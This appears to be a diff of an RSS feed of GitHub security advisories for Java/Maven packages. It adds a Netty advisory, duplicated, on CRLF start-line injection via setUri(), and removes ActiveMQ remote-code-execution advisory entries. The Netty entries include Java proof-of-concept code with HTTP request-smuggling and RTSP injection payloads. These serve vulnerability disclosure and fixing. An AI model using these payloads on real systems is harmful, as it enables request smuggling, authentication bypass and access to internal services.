@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
     <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
-    <updated>2026-05-05T18:25:15.123Z</updated>
+    <updated>2026-05-05T19:28:57.322Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
     <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
@@ -11,6 +11,410 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[io.netty:netty-codec-http] Netty: Start-Line Injection in DefaultHttpRequest.setUri() Allows HTTP Request Smuggling and RTSP Request Injection]]></title>
+        <id>https://github.com/advisories/GHSA-v8h7-rr48-vmmv</id>
+        <link href="https://github.com/advisories/GHSA-v8h7-rr48-vmmv"/>
+        <updated>2026-05-05T18:27:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Netty allows request-line validation to be bypassed when a <code>DefaultHttpRequest</code> or <code>DefaultFullHttpRequest</code> is created first and its URI is later changed via <code>setUri()</code>.</p>
+<p>The constructors reject CRLF and whitespace characters that would break the start-line, but <code>setUri()</code> does not apply the same validation. <code>HttpRequestEncoder</code> and <code>RtspEncoder</code> then write the URI into the request line verbatim. If attacker-controlled input reaches <code>setUri()</code>, this enables CRLF injection and insertion of additional HTTP or RTSP requests.</p>
+<p>In practice, this leads to HTTP request smuggling / desynchronization on the HTTP side and request injection on the RTSP side.</p>
+<h3 id="details">Details</h3>
+<p>The root issue is that URI validation exists only on the constructor path, but not on the public setter path.</p>
+<ul>
+<li><code>io.netty.handler.codec.http.DefaultHttpRequest</code><ul>
+<li>The constructor calls <code>HttpUtil.validateRequestLineTokens(method, uri)</code></li>
+<li><code>setUri(String uri)</code> only performs <code>checkNotNull</code> and does not validate</li>
+</ul>
+</li>
+<li><code>io.netty.handler.codec.http.DefaultFullHttpRequest</code><ul>
+<li><code>setUri(String uri)</code> delegates to the parent implementation</li>
+</ul>
+</li>
+<li><code>io.netty.handler.codec.http.HttpRequestEncoder</code><ul>
+<li>Writes <code>request.uri()</code> directly into the request line</li>
+</ul>
+</li>
+<li><code>io.netty.handler.codec.rtsp.RtspEncoder</code><ul>
+<li>Writes <code>request.uri()</code> directly into the request line</li>
+</ul>
+</li>
+</ul>
+<p>This creates the following bypass:</p>
+<ol>
+<li>An application creates a <code>DefaultHttpRequest</code> or <code>DefaultFullHttpRequest</code> with a safe URI</li>
+<li>Later, attacker-influenced input is passed into <code>setUri()</code></li>
+<li><code>HttpRequestEncoder</code> or <code>RtspEncoder</code> encodes that value verbatim</li>
+<li>The downstream server, proxy, or RTSP peer interprets the injected bytes after CRLF as separate requests</li>
+</ol>
+<p>This appears to be an incomplete fix pattern where start-line validation exists, but can still be bypassed through a mutable public API.</p>
+<h3 id="poc-http">PoC (HTTP)</h3>
+<p>The following code first creates a normal request object and then injects a malicious request line using <code>setUri()</code>.</p>
+<pre><code class="language-java">import io.netty.buffer.ByteBuf;
+import io.netty.channel.embedded.EmbeddedChannel;
+import io.netty.handler.codec.http.DefaultHttpRequest;
+import io.netty.handler.codec.http.HttpMethod;
+import io.netty.handler.codec.http.HttpRequestEncoder;
+import io.netty.handler.codec.http.HttpServerCodec;
+import io.netty.handler.codec.http.HttpVersion;
+import io.netty.util.CharsetUtil;
+
+public final class HttpSetUriSmugglePoc {
+    public static void main(String[] args) {
+        EmbeddedChannel client = new EmbeddedChannel(new HttpRequestEncoder());
+        EmbeddedChannel server = new EmbeddedChannel(new HttpServerCodec());
+
+        DefaultHttpRequest request = new DefaultHttpRequest(
+                HttpVersion.HTTP_1_1, HttpMethod.GET, "/safe");
+
+        request.setUri("/s1 HTTP/1.1\r\n" +
+                "\r\n" +
+                "POST /s2 HTTP/1.1\r\n" +
+                "content-length: 11\r\n\r\n" +
+                "Hello World" +
+                "GET /s1");
+
+        client.writeOutbound(request);
+        ByteBuf outbound = client.readOutbound();
+
+        System.out.println("=== Raw encoded request ===");
+        System.out.println(outbound.toString(CharsetUtil.US_ASCII));
+
+        System.out.println("=== Decoded by HttpServerCodec ===");
+        server.writeInbound(outbound.retainedDuplicate());
+
+        Object msg;
+        while ((msg = server.readInbound()) != null) {
+            System.out.println(msg);
+        }
+
+        outbound.release();
+        client.finishAndReleaseAll();
+        server.finishAndReleaseAll();
+    }
+}
+</code></pre>
+<p>When reproduced, the raw encoded request looks like this:</p>
+<pre><code class="language-http">GET /s1 HTTP/1.1
+
+POST /s2 HTTP/1.1
+content-length: 11
+
+Hello WorldGET /s1 HTTP/1.1
+</code></pre>
+<p><code>HttpServerCodec</code> then parses this as multiple HTTP messages rather than a single request:</p>
+<ul>
+<li><code>GET /s1</code></li>
+<li><code>POST /s2</code> with body <code>Hello World</code></li>
+<li>trailing <code>GET /s1</code></li>
+</ul>
+<p>This confirms that the value supplied through <code>setUri()</code> is interpreted on the wire as additional requests.</p>
+<h3 id="poc-rtsp">PoC (RTSP)</h3>
+<p>The same root cause also affects <code>RtspEncoder</code>. A minimal reproduction is shown below.</p>
+<pre><code class="language-java">import io.netty.buffer.ByteBuf;
+import io.netty.channel.embedded.EmbeddedChannel;
+import io.netty.handler.codec.http.DefaultHttpRequest;
+import io.netty.handler.codec.rtsp.RtspDecoder;
+import io.netty.handler.codec.rtsp.RtspEncoder;
+import io.netty.handler.codec.rtsp.RtspMethods;
+import io.netty.handler.codec.rtsp.RtspVersions;
+import io.netty.util.CharsetUtil;
+
+public final class RtspSetUriSmugglePoc {
+    public static void main(String[] args) {
+        EmbeddedChannel client = new EmbeddedChannel(new RtspEncoder());
+        EmbeddedChannel server = new EmbeddedChannel(new RtspDecoder());
+
+        DefaultHttpRequest request = new DefaultHttpRequest(
+                RtspVersions.RTSP_1_0, RtspMethods.OPTIONS, "rtsp://safe/media");
+
+        request.setUri("rtsp://cam/stream RTSP/1.0\r\n" +
+                "CSeq: 1\r\n\r\n" +
+                "DESCRIBE rtsp://cam/secret RTSP/1.0\r\n" +
+                "CSeq: 2\r\n\r\n" +
+                "OPTIONS rtsp://cam/final");
+
+        client.writeOutbound(request);
+        ByteBuf outbound = client.readOutbound();
+
+        System.out.println("=== Raw encoded RTSP request ===");
+        System.out.println(outbound.toString(CharsetUtil.US_ASCII));
+
+        System.out.println("=== Decoded by RtspDecoder ===");
+        server.writeInbound(outbound.retainedDuplicate());
+    }
+}
+</code></pre>
+<p>When reproduced, <code>RtspEncoder</code> generates consecutive RTSP requests in a single encoded payload:</p>
+<pre><code class="language-text">OPTIONS rtsp://cam/stream RTSP/1.0
+CSeq: 1
+
+DESCRIBE rtsp://cam/secret RTSP/1.0
+CSeq: 2
+
+OPTIONS rtsp://cam/final RTSP/1.0
+</code></pre>
+<p><code>RtspDecoder</code> then parses this as three separate RTSP requests:</p>
+<ul>
+<li><code>OPTIONS rtsp://cam/stream</code></li>
+<li><code>DESCRIBE rtsp://cam/secret</code></li>
+<li><code>OPTIONS rtsp://cam/final</code></li>
+</ul>
+<p>This confirms that the same setter bypass is exploitable for RTSP request injection as well.</p>
+<h3 id="impact">Impact</h3>
+<p>The vulnerable conditions are:</p>
+<ul>
+<li>The application uses <code>DefaultHttpRequest</code> or <code>DefaultFullHttpRequest</code></li>
+<li>The request object is created first and later modified through <code>setUri()</code></li>
+<li>The value passed into <code>setUri()</code> is attacker-controlled or attacker-influenced</li>
+<li>The object is eventually serialized by <code>HttpRequestEncoder</code> or <code>RtspEncoder</code></li>
+</ul>
+<p>Under those conditions, an attacker may be able to:</p>
+<ul>
+<li>perform HTTP request smuggling</li>
+<li>trigger proxy/backend desynchronization</li>
+<li>inject additional requests toward internal APIs</li>
+<li>confuse request boundaries and bypass assumptions around authentication or routing</li>
+<li>inject RTSP requests</li>
+</ul>
+<p>The exact impact depends on how the application constructs URIs and how the upstream/downstream HTTP or RTSP components parse request boundaries, but the security impact is real and reproducible.</p>
+<h3 id="root-cause">Root Cause</h3>
+<p>Validation is enforced only at object construction time, but not on the public mutation API that can break the same security invariant.</p>
+<p>As a result, the constructors are safe while the public <code>setUri()</code> path is not, and the encoders trust and serialize the mutated value without revalidation.</p>
+<h3 id="suggested-fix-direction">Suggested Fix Direction</h3>
+<p><code>DefaultHttpRequest.setUri()</code> and all delegating/inheriting paths should apply the same request-line token validation as the constructors.</p>
+<p>Recommended regression coverage:</p>
+<ul>
+<li>verify that <code>setUri()</code> rejects CRLF-containing input after object construction</li>
+<li>verify that <code>DefaultFullHttpRequest.setUri()</code> is blocked as well</li>
+<li>verify that spaces, <code>\r</code>, <code>\n</code>, and request-smuggling payloads are rejected</li>
+<li>verify that both <code>HttpRequestEncoder</code> and <code>RtspEncoder</code> are protected from setter-based bypasses</li>
+</ul>
+<h3 id="affected-area">Affected Area</h3>
+<ul>
+<li><code>netty-codec-http</code></li>
+<li><code>io.netty.handler.codec.http.DefaultHttpRequest</code></li>
+<li><code>io.netty.handler.codec.http.DefaultFullHttpRequest</code></li>
+<li><code>io.netty.handler.codec.http.HttpRequestEncoder</code></li>
+<li><code>io.netty.handler.codec.rtsp.RtspEncoder</code></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/netty/netty/security/advisories/GHSA-v8h7-rr48-vmmv">https://github.com/netty/netty/security/advisories/GHSA-v8h7-rr48-vmmv</a></li>
+<li><a href="https://github.com/advisories/GHSA-v8h7-rr48-vmmv">https://github.com/advisories/GHSA-v8h7-rr48-vmmv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v8h7-rr48-vmmv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T18:27:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[io.netty:netty-codec-http] Netty: Start-Line Injection in DefaultHttpRequest.setUri() Allows HTTP Request Smuggling and RTSP Request Injection]]></title>
+        <id>https://github.com/advisories/GHSA-v8h7-rr48-vmmv</id>
+        <link href="https://github.com/advisories/GHSA-v8h7-rr48-vmmv"/>
+        <updated>2026-05-05T18:27:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Netty allows request-line validation to be bypassed when a <code>DefaultHttpRequest</code> or <code>DefaultFullHttpRequest</code> is created first and its URI is later changed via <code>setUri()</code>.</p>
+<p>The constructors reject CRLF and whitespace characters that would break the start-line, but <code>setUri()</code> does not apply the same validation. <code>HttpRequestEncoder</code> and <code>RtspEncoder</code> then write the URI into the request line verbatim. If attacker-controlled input reaches <code>setUri()</code>, this enables CRLF injection and insertion of additional HTTP or RTSP requests.</p>
+<p>In practice, this leads to HTTP request smuggling / desynchronization on the HTTP side and request injection on the RTSP side.</p>
+<h3 id="details">Details</h3>
+<p>The root issue is that URI validation exists only on the constructor path, but not on the public setter path.</p>
+<ul>
+<li><code>io.netty.handler.codec.http.DefaultHttpRequest</code><ul>
+<li>The constructor calls <code>HttpUtil.validateRequestLineTokens(method, uri)</code></li>
+<li><code>setUri(String uri)</code> only performs <code>checkNotNull</code> and does not validate</li>
+</ul>
+</li>
+<li><code>io.netty.handler.codec.http.DefaultFullHttpRequest</code><ul>
+<li><code>setUri(String uri)</code> delegates to the parent implementation</li>
+</ul>
+</li>
+<li><code>io.netty.handler.codec.http.HttpRequestEncoder</code><ul>
+<li>Writes <code>request.uri()</code> directly into the request line</li>
+</ul>
+</li>
+<li><code>io.netty.handler.codec.rtsp.RtspEncoder</code><ul>
+<li>Writes <code>request.uri()</code> directly into the request line</li>
+</ul>
+</li>
+</ul>
+<p>This creates the following bypass:</p>
+<ol>
+<li>An application creates a <code>DefaultHttpRequest</code> or <code>DefaultFullHttpRequest</code> with a safe URI</li>
+<li>Later, attacker-influenced input is passed into <code>setUri()</code></li>
+<li><code>HttpRequestEncoder</code> or <code>RtspEncoder</code> encodes that value verbatim</li>
+<li>The downstream server, proxy, or RTSP peer interprets the injected bytes after CRLF as separate requests</li>
+</ol>
+<p>This appears to be an incomplete fix pattern where start-line validation exists, but can still be bypassed through a mutable public API.</p>
+<h3 id="poc-http">PoC (HTTP)</h3>
+<p>The following code first creates a normal request object and then injects a malicious request line using <code>setUri()</code>.</p>
+<pre><code class="language-java">import io.netty.buffer.ByteBuf;
+import io.netty.channel.embedded.EmbeddedChannel;
+import io.netty.handler.codec.http.DefaultHttpRequest;
+import io.netty.handler.codec.http.HttpMethod;
+import io.netty.handler.codec.http.HttpRequestEncoder;
+import io.netty.handler.codec.http.HttpServerCodec;
+import io.netty.handler.codec.http.HttpVersion;
+import io.netty.util.CharsetUtil;
+
+public final class HttpSetUriSmugglePoc {
+    public static void main(String[] args) {
+        EmbeddedChannel client = new EmbeddedChannel(new HttpRequestEncoder());
+        EmbeddedChannel server = new EmbeddedChannel(new HttpServerCodec());
+
+        DefaultHttpRequest request = new DefaultHttpRequest(
+                HttpVersion.HTTP_1_1, HttpMethod.GET, "/safe");
+
+        request.setUri("/s1 HTTP/1.1\r\n" +
+                "\r\n" +
+                "POST /s2 HTTP/1.1\r\n" +
+                "content-length: 11\r\n\r\n" +
+                "Hello World" +
+                "GET /s1");
+
+        client.writeOutbound(request);
+        ByteBuf outbound = client.readOutbound();
+
+        System.out.println("=== Raw encoded request ===");
+        System.out.println(outbound.toString(CharsetUtil.US_ASCII));
+
+        System.out.println("=== Decoded by HttpServerCodec ===");
+        server.writeInbound(outbound.retainedDuplicate());
+
+        Object msg;
+        while ((msg = server.readInbound()) != null) {
+            System.out.println(msg);
+        }
+
+        outbound.release();
+        client.finishAndReleaseAll();
+        server.finishAndReleaseAll();
+    }
+}
+</code></pre>
+<p>When reproduced, the raw encoded request looks like this:</p>
+<pre><code class="language-http">GET /s1 HTTP/1.1
+
+POST /s2 HTTP/1.1
+content-length: 11
+
+Hello WorldGET /s1 HTTP/1.1
+</code></pre>
+<p><code>HttpServerCodec</code> then parses this as multiple HTTP messages rather than a single request:</p>
+<ul>
+<li><code>GET /s1</code></li>
+<li><code>POST /s2</code> with body <code>Hello World</code></li>
+<li>trailing <code>GET /s1</code></li>
+</ul>
+<p>This confirms that the value supplied through <code>setUri()</code> is interpreted on the wire as additional requests.</p>
+<h3 id="poc-rtsp">PoC (RTSP)</h3>
+<p>The same root cause also affects <code>RtspEncoder</code>. A minimal reproduction is shown below.</p>
+<pre><code class="language-java">import io.netty.buffer.ByteBuf;
+import io.netty.channel.embedded.EmbeddedChannel;
+import io.netty.handler.codec.http.DefaultHttpRequest;
+import io.netty.handler.codec.rtsp.RtspDecoder;
+import io.netty.handler.codec.rtsp.RtspEncoder;
+import io.netty.handler.codec.rtsp.RtspMethods;
+import io.netty.handler.codec.rtsp.RtspVersions;
+import io.netty.util.CharsetUtil;
+
+public final class RtspSetUriSmugglePoc {
+    public static void main(String[] args) {
+        EmbeddedChannel client = new EmbeddedChannel(new RtspEncoder());
+        EmbeddedChannel server = new EmbeddedChannel(new RtspDecoder());
+
+        DefaultHttpRequest request = new DefaultHttpRequest(
+                RtspVersions.RTSP_1_0, RtspMethods.OPTIONS, "rtsp://safe/media");
+
+        request.setUri("rtsp://cam/stream RTSP/1.0\r\n" +
+                "CSeq: 1\r\n\r\n" +
+                "DESCRIBE rtsp://cam/secret RTSP/1.0\r\n" +
+                "CSeq: 2\r\n\r\n" +
+                "OPTIONS rtsp://cam/final");
+
+        client.writeOutbound(request);
+        ByteBuf outbound = client.readOutbound();
+
+        System.out.println("=== Raw encoded RTSP request ===");
+        System.out.println(outbound.toString(CharsetUtil.US_ASCII));
+
+        System.out.println("=== Decoded by RtspDecoder ===");
+        server.writeInbound(outbound.retainedDuplicate());
+    }
+}
+</code></pre>
+<p>When reproduced, <code>RtspEncoder</code> generates consecutive RTSP requests in a single encoded payload:</p>
+<pre><code class="language-text">OPTIONS rtsp://cam/stream RTSP/1.0
+CSeq: 1
+
+DESCRIBE rtsp://cam/secret RTSP/1.0
+CSeq: 2
+
+OPTIONS rtsp://cam/final RTSP/1.0
+</code></pre>
+<p><code>RtspDecoder</code> then parses this as three separate RTSP requests:</p>
+<ul>
+<li><code>OPTIONS rtsp://cam/stream</code></li>
+<li><code>DESCRIBE rtsp://cam/secret</code></li>
+<li><code>OPTIONS rtsp://cam/final</code></li>
+</ul>
+<p>This confirms that the same setter bypass is exploitable for RTSP request injection as well.</p>
+<h3 id="impact">Impact</h3>
+<p>The vulnerable conditions are:</p>
+<ul>
+<li>The application uses <code>DefaultHttpRequest</code> or <code>DefaultFullHttpRequest</code></li>
+<li>The request object is created first and later modified through <code>setUri()</code></li>
+<li>The value passed into <code>setUri()</code> is attacker-controlled or attacker-influenced</li>
+<li>The object is eventually serialized by <code>HttpRequestEncoder</code> or <code>RtspEncoder</code></li>
+</ul>
+<p>Under those conditions, an attacker may be able to:</p>
+<ul>
+<li>perform HTTP request smuggling</li>
+<li>trigger proxy/backend desynchronization</li>
+<li>inject additional requests toward internal APIs</li>
+<li>confuse request boundaries and bypass assumptions around authentication or routing</li>
+<li>inject RTSP requests</li>
+</ul>
+<p>The exact impact depends on how the application constructs URIs and how the upstream/downstream HTTP or RTSP components parse request boundaries, but the security impact is real and reproducible.</p>
+<h3 id="root-cause">Root Cause</h3>
+<p>Validation is enforced only at object construction time, but not on the public mutation API that can break the same security invariant.</p>
+<p>As a result, the constructors are safe while the public <code>setUri()</code> path is not, and the encoders trust and serialize the mutated value without revalidation.</p>
+<h3 id="suggested-fix-direction">Suggested Fix Direction</h3>
+<p><code>DefaultHttpRequest.setUri()</code> and all delegating/inheriting paths should apply the same request-line token validation as the constructors.</p>
+<p>Recommended regression coverage:</p>
+<ul>
+<li>verify that <code>setUri()</code> rejects CRLF-containing input after object construction</li>
+<li>verify that <code>DefaultFullHttpRequest.setUri()</code> is blocked as well</li>
+<li>verify that spaces, <code>\r</code>, <code>\n</code>, and request-smuggling payloads are rejected</li>
+<li>verify that both <code>HttpRequestEncoder</code> and <code>RtspEncoder</code> are protected from setter-based bypasses</li>
+</ul>
+<h3 id="affected-area">Affected Area</h3>
+<ul>
+<li><code>netty-codec-http</code></li>
+<li><code>io.netty.handler.codec.http.DefaultHttpRequest</code></li>
+<li><code>io.netty.handler.codec.http.DefaultFullHttpRequest</code></li>
+<li><code>io.netty.handler.codec.http.HttpRequestEncoder</code></li>
+<li><code>io.netty.handler.codec.rtsp.RtspEncoder</code></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/netty/netty/security/advisories/GHSA-v8h7-rr48-vmmv">https://github.com/netty/netty/security/advisories/GHSA-v8h7-rr48-vmmv</a></li>
+<li><a href="https://github.com/advisories/GHSA-v8h7-rr48-vmmv">https://github.com/advisories/GHSA-v8h7-rr48-vmmv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v8h7-rr48-vmmv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-05T18:27:35.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[org.apache.camel:camel-coap] Apache camel-coap allows header injection that can lead to remote code execution]]></title>
         <id>https://github.com/advisories/GHSA-695c-x5gc-94gj</id>
@@ -463,58 +867,6 @@ Because Spring's ResourceXmlApplicationContext instantiates all singleton beans 
     </entry>
     <entry>
         <title type="html"><![CDATA[[org.apache.activemq:apache-activemq] Apache ActiveMQ Vulnerable to Improper Input Validation and Code Injection]]></title>
-        <id>https://github.com/advisories/GHSA-w3w2-mpp5-92gm</id>
-        <link href="https://github.com/advisories/GHSA-w3w2-mpp5-92gm"/>
-        <updated>2026-05-05T00:10:00.000Z</updated>
-        <content type="html"><![CDATA[<p>Improper Input Validation, Improper Control of Generation of Code ('Code Injection') vulnerability in Apache ActiveMQ Broker, Apache ActiveMQ All, Apache ActiveMQ.</p>
-<p>An authenticated attacker may bypass the fix in CVE-2026-34197 by adding a connector using an HTTP Discovery transport via&nbsp;BrokerView.addNetworkConnector or&nbsp;BrokerView.addConnector through&nbsp;Jolokia if the activemq-http module is on the classpath.
-A malicious HTTP endpoint can return a VM transport through the HTTP URI which will bypass the validation added in CVE-2026-34197. The attacker can then use the VM transport's brokerConfig parameter to load a remote Spring XML application context using ResourceXmlApplicationContext.
-Because Spring's ResourceXmlApplicationContext instantiates all singleton beans before the BrokerService validates the configuration, arbitrary code execution occurs on the broker's JVM through bean factory methods such as Runtime.exec().</p>
-<p>This issue affects Apache ActiveMQ Broker: before 5.19.6, from 6.0.0 before 6.2.5; Apache ActiveMQ All: before 5.19.6, from 6.0.0 before 6.2.5; Apache ActiveMQ: before 5.19.6, from 6.0.0 before 6.2.5.</p>
-<p>Users are recommended to upgrade to version 5.19.6 or 6.2.5, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40466">https://nvd.nist.gov/vuln/detail/CVE-2026-40466</a></li>
-<li><a href="https://activemq.apache.org/security-advisories.data/CVE-2026-34197-announcement.txt">https://activemq.apache.org/security-advisories.data/CVE-2026-34197-announcement.txt</a></li>
-<li><a href="https://github.com/advisories/GHSA-w3w2-mpp5-92gm">https://github.com/advisories/GHSA-w3w2-mpp5-92gm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w3w2-mpp5-92gm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-24T12:30:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.apache.activemq:activemq-broker] Apache ActiveMQ Vulnerable to Improper Input Validation and Code Injection]]></title>
-        <id>https://github.com/advisories/GHSA-w3w2-mpp5-92gm</id>
-        <link href="https://github.com/advisories/GHSA-w3w2-mpp5-92gm"/>
-        <updated>2026-05-05T00:10:00.000Z</updated>
-        <content type="html"><![CDATA[<p>Improper Input Validation, Improper Control of Generation of Code ('Code Injection') vulnerability in Apache ActiveMQ Broker, Apache ActiveMQ All, Apache ActiveMQ.</p>
-<p>An authenticated attacker may bypass the fix in CVE-2026-34197 by adding a connector using an HTTP Discovery transport via&nbsp;BrokerView.addNetworkConnector or&nbsp;BrokerView.addConnector through&nbsp;Jolokia if the activemq-http module is on the classpath.
-A malicious HTTP endpoint can return a VM transport through the HTTP URI which will bypass the validation added in CVE-2026-34197. The attacker can then use the VM transport's brokerConfig parameter to load a remote Spring XML application context using ResourceXmlApplicationContext.
-Because Spring's ResourceXmlApplicationContext instantiates all singleton beans before the BrokerService validates the configuration, arbitrary code execution occurs on the broker's JVM through bean factory methods such as Runtime.exec().</p>
-<p>This issue affects Apache ActiveMQ Broker: before 5.19.6, from 6.0.0 before 6.2.5; Apache ActiveMQ All: before 5.19.6, from 6.0.0 before 6.2.5; Apache ActiveMQ: before 5.19.6, from 6.0.0 before 6.2.5.</p>
-<p>Users are recommended to upgrade to version 5.19.6 or 6.2.5, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40466">https://nvd.nist.gov/vuln/detail/CVE-2026-40466</a></li>
-<li><a href="https://activemq.apache.org/security-advisories.data/CVE-2026-34197-announcement.txt">https://activemq.apache.org/security-advisories.data/CVE-2026-34197-announcement.txt</a></li>
-<li><a href="https://github.com/advisories/GHSA-w3w2-mpp5-92gm">https://github.com/advisories/GHSA-w3w2-mpp5-92gm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w3w2-mpp5-92gm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-24T12:30:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.apache.activemq:activemq-all] Apache ActiveMQ Vulnerable to Improper Input Validation and Code Injection]]></title>
         <id>https://github.com/advisories/GHSA-w3w2-mpp5-92gm</id>
         <link href="https://github.com/advisories/GHSA-w3w2-mpp5-92gm"/>
         <updated>2026-05-05T00:10:00.000Z</updated>
